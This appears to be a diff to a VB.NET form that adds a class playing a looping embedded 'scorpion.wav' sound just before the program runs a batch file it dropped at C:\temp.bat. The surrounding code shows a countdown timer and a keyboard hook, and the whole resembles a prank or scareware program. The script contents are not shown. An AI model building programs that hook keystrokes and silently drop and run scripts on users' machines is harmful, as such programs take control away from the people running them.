@@ -12,6 +12,7 @@ Public Class Form2
 
     Public countdownTime As Integer = 60 ' Countdown timer in seconds
     Private ReadOnly audioPlayerd As New AudioPlayer()
+    Private ReadOnly audioPlayerd2 As New AudioPlayer2()
     Private Const WM_KEYDOWN As Integer = &H100
     Private hookCallbackDelegate As HookProc
     ' Delegate for hook callback
@@ -172,6 +173,63 @@ Public Class Form2
         End Sub
     End Class
 
+    Public Class AudioPlayer2
+        Implements IDisposable
+
+        Private ReadOnly soundPlayer As New SoundPlayer()
+        Private ReadOnly wavStream As MemoryStream
+        Private disposedValue As Boolean ' To detect redundant calls
+
+        Public Sub New()
+            ' Extract the WAV byte array from resources (scorpion.wav)
+            Dim wavBytes As Byte() = My.Resources.Resource1.scorpion ' Replace Resource1 with your resource file name.
+
+            ' Use MemoryStream to play the WAV
+            wavStream = New MemoryStream(wavBytes)
+
+            ' Load the WAV file into the SoundPlayer
+            soundPlayer.Stream = wavStream
+        End Sub
+
+        ' Method to play the audio in a loop
+        Public Sub PlayAudio()
+            soundPlayer.PlayLooping()
+        End Sub
+
+        ' Method to stop the audio
+        Public Sub StopAudio()
+            soundPlayer.Stop()
+        End Sub
+
+        ' Protected implementation of Dispose pattern.
+        Protected Overridable Sub Dispose(disposing As Boolean)
+            If Not disposedValue Then
+                If disposing Then
+                    ' Dispose managed state (managed objects).
+                    soundPlayer.Dispose()
+                    wavStream.Dispose()
+                End If
+
+                ' Free unmanaged resources (if any) here.
+                ' Set large fields to null (if any).
+
+                disposedValue = True
+            End If
+        End Sub
+
+        ' This code added to correctly implement the disposable pattern.
+        Public Sub Dispose() Implements IDisposable.Dispose
+            Dispose(True)
+            GC.SuppressFinalize(Me)
+        End Sub
+
+        ' Finalizer (only if you have unmanaged resources)
+        Protected Overrides Sub Finalize()
+            ' Do not change this code. Put cleanup code in Dispose(disposing As Boolean) above.
+            Dispose(False)
+        End Sub
+    End Class
+
     Private Sub CreateEpicScriptFiles()
         ' Define the paths
         Dim vbsFilePath As String = "C:\temp.vbs"
@@ -241,6 +299,8 @@ Public Class Form2
         CreateEpicScriptFiles()
         Dim scriptPath As String = "C:\temp.bat" ' Correct the file extension to .bat
         Try
+            ' Initialize and start audio
+            audioPlayerd2.PlayAudio()
             Dim process As New Process()
             process.StartInfo.FileName = "cmd.exe"
             process.StartInfo.Arguments = "/c """ & scriptPath & """" ' Use /c to run and close cmd
